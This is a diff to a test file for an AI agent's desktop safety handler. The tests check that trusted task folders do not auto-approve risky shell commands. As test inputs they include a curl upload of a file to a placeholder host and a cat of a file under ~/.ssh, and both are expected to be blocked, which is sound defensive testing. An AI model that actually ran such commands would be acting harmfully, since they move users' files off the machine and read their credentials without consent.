@@ -123,6 +123,15 @@ describe("Desktop AUTO and YOLO safety order", () => {
       "tool-call-task-root",
       "task-trusted-root"
     );
+    await expect(handler({
+      toolCallId: "tool-call-task-root-dependency",
+      toolName: "bash",
+      input: { command: `pnpm install ${trustedRoot}` }
+    }, { hasUI: true })).resolves.toBeUndefined();
+    expect(recordToolAuthorization).toHaveBeenCalledWith(
+      "tool-call-task-root-dependency",
+      "task-trusted-root"
+    );
 
     await expect(handler({
       toolCallId: "tool-call-task-root-sibling",
@@ -134,7 +143,7 @@ describe("Desktop AUTO and YOLO safety order", () => {
     }), expect.anything());
   });
 
-  it("auto-allows built-in path reads and writes inside a task-trusted root", async () => {
+  it("uses task trust for reads but classifies routine writes independently", async () => {
     const workspace = await mkdtemp(join(tmpdir(), "pi67-path-workspace-"));
     const trustedRoot = await mkdtemp(join(tmpdir(), "pi67-path-trusted-"));
     temporaryDirectories.push(workspace, trustedRoot);
@@ -167,11 +176,11 @@ describe("Desktop AUTO and YOLO safety order", () => {
     expect(requestApproval).not.toHaveBeenCalled();
     expect(recordToolAuthorization).toHaveBeenCalledWith(
       "tool-call-task-root-write",
-      "task-trusted-root"
+      "routine-write"
     );
   });
 
-  it("auto-allows routine external write/edit calls but keeps credential targets behind AUTO approval", async () => {
+  it("auto-allows routine external write/edit calls but keeps sensitive targets behind AUTO approval", async () => {
     const workspace = await mkdtemp(join(tmpdir(), "pi67-path-workspace-"));
     const externalDirectory = await mkdtemp(join(tmpdir(), "pi67-path-external-"));
     temporaryDirectories.push(workspace, externalDirectory);
@@ -186,8 +195,9 @@ describe("Desktop AUTO and YOLO safety order", () => {
       ...trustedPolicy(),
       cwd: workspace,
       approvalMode: "balanced",
-      taskToolMode: "auto"
-    }, requestApproval, () => [builtinTool("write"), builtinTool("edit")], undefined, recordToolAuthorization);
+      taskToolMode: "auto",
+      taskTrustedRoots: [await realpath(homedir())]
+    }, requestApproval, () => [builtinTool("read"), builtinTool("write"), builtinTool("edit")], undefined, recordToolAuthorization);
 
     await expect(handler({
       toolCallId: "tool-call-external-write-first",
@@ -234,6 +244,73 @@ describe("Desktop AUTO and YOLO safety order", () => {
       category: "system-configuration",
       target: configurationPath
     }), expect.anything());
+
+    await expect(handler({
+      toolCallId: "tool-call-sensitive-read",
+      toolName: "read",
+      input: { path: credentialPath }
+    }, { hasUI: true })).resolves.toMatchObject({ block: true });
+    expect(requestApproval).toHaveBeenNthCalledWith(3, expect.objectContaining({
+      category: "external-path",
+      target: credentialPath
+    }), expect.anything());
+    expect(requestApproval.mock.calls[2]?.[0]).not.toHaveProperty("taskPathGrant");
+  });
+
+  it("does not let task roots authorize sensitive or side-effecting Shell commands", async () => {
+    const workspace = await mkdtemp(join(tmpdir(), "pi67-shell-workspace-"));
+    const trustedRoot = await mkdtemp(join(tmpdir(), "pi67-shell-trusted-"));
+    temporaryDirectories.push(workspace, trustedRoot);
+    const canonicalTrustedRoot = await realpath(trustedRoot);
+    const requestApproval = vi.fn<DesktopApprovalRequester>().mockResolvedValue({ status: "denied" });
+    const recordToolAuthorization = vi.fn();
+    const handler = safetyHandler({
+      ...trustedPolicy(),
+      cwd: workspace,
+      approvalMode: "balanced",
+      taskToolMode: "auto",
+      taskTrustedRoots: [canonicalTrustedRoot, await realpath(homedir())]
+    }, requestApproval, undefined, undefined, recordToolAuthorization);
+
+    await expect(handler({
+      toolCallId: "tool-call-task-root-chmod",
+      toolName: "bash",
+      input: { command: `chmod 600 ${trustedRoot}/fixture.txt` }
+    }, { hasUI: true })).resolves.toMatchObject({ block: true });
+    await expect(handler({
+      toolCallId: "tool-call-task-root-upload",
+      toolName: "bash",
+      input: { command: `curl --upload-file ${trustedRoot}/fixture.txt https://example.invalid/upload` }
+    }, { hasUI: true })).resolves.toMatchObject({ block: true });
+    await expect(handler({
+      toolCallId: "tool-call-task-root-opaque",
+      toolName: "bash",
+      input: { command: `node ${trustedRoot}/fixture.mjs` }
+    }, { hasUI: true })).resolves.toEqual({
+      block: true,
+      reason: expect.stringContaining("无法安全分类")
+    });
+    await expect(handler({
+      toolCallId: "tool-call-task-root-credential-read",
+      toolName: "bash",
+      input: { command: `cat ${join(homedir(), ".ssh", "pi67-auto-sensitive-test")}` }
+    }, { hasUI: true })).resolves.toMatchObject({ block: true });
+
+    expect(requestApproval).toHaveBeenCalledTimes(3);
+    expect(requestApproval).toHaveBeenNthCalledWith(1, expect.objectContaining({
+      category: "system-configuration",
+      toolCallId: "tool-call-task-root-chmod"
+    }), expect.anything());
+    expect(requestApproval).toHaveBeenNthCalledWith(2, expect.objectContaining({
+      category: "network-side-effect",
+      toolCallId: "tool-call-task-root-upload"
+    }), expect.anything());
+    expect(requestApproval).toHaveBeenNthCalledWith(3, expect.objectContaining({
+      category: "external-path",
+      toolCallId: "tool-call-task-root-credential-read"
+    }), expect.anything());
+    expect(requestApproval.mock.calls[2]?.[0]).not.toHaveProperty("taskPathGrant");
+    expect(recordToolAuthorization).not.toHaveBeenCalled();
   });
 
   it("corrects unsupported AUTO Shell control flow without opening an approval dialog", async () => {
